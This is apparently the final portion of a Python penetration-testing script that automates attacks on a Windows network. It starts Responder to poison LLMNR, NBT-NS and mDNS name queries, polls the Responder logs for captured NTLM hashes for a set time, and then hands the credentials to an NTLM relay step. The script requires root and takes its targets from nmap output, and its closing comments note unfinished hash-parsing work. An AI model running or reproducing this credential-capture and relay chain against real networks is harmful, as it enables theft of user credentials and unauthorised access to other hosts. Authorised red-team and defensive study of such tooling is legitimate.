    if 'llmnr' not in args.skip.lower():
        print('\n[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
        prev_lines = []
        resp_proc = start_responder_llmnr()
        time.sleep(2)

        # Check for hashes for set amount of time
        timeout = time.time() + 60 * int(args.time)
        try:
            while time.time() < timeout:
                prev_creds, new_lines = parse_responder_log(args, prev_lines, prev_creds)

                for line in new_lines:
                    prev_lines.append(line)

                time.sleep(0.1)

            prev_creds = cleanup_responder(resp_proc, prev_creds)

        except KeyboardInterrupt:
            print('\n[-] Killing Responder.py and moving on')
            prev_creds = cleanup_responder(resp_proc, prev_creds)
            # Give responder some time to die with dignity
            time.sleep(2)

    # ATTACK 4: NTLM relay
    # ATTACK 5: IPv6 DNS WPAD spoof
    if 'relay' not in args.skip.lower() and len(hosts) > 0:
        do_ntlmrelay(prev_creds, args)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        exit('[-] Run as root')
    report = parse_nmap(args)
    main(report, args)

# Left off
# Change responder hash-finding to read Responder-Session.log and not the hash file
# Multiple hashes get stored in the hashfile so just continually checking for new hash files
# wont work at all on new hashes written to the same file
